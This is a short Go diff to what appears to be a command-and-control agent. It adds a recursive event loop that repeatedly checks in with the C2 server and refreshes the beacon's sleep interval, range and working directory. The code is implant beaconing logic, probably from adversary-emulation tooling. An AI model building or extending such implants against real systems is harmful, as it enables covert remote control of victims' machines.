@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"log"
 	"math/rand"
+	"os"
 	"path/filepath"
 	"time"
 
@@ -12,7 +13,7 @@ import (
 
 //Contact defines required functions for communicating with the server
 type Contact interface {
-	Communicate(agent *util.AgentConfig, beacon Beacon)
+	Communicate(agent *util.AgentConfig, beacon Beacon) Beacon
 }
 
 //CommunicationChannels contains the contact implementations
@@ -37,6 +38,20 @@ type Instruction struct {
 	Response string
 	Status int
 	Pid int
+}
+
+func EventLoop(agent *util.AgentConfig, beacon Beacon) {
+	respBeacon := CommunicationChannels[agent.Contact].Communicate(agent, beacon)
+	refreshBeacon(agent, &respBeacon)
+	log.Printf("C2 refreshed. [%s] agent at PID %d.", agent.Address, os.Getpid())
+	EventLoop(agent, respBeacon)
+}
+
+func refreshBeacon(agent *util.AgentConfig, beacon *Beacon) {
+	pwd, _ := os.Getwd()
+	beacon.Sleep = agent.Sleep
+	beacon.Range = agent.Range
+	beacon.Pwd = pwd
 }
 
 func requestPayload(target string) string {
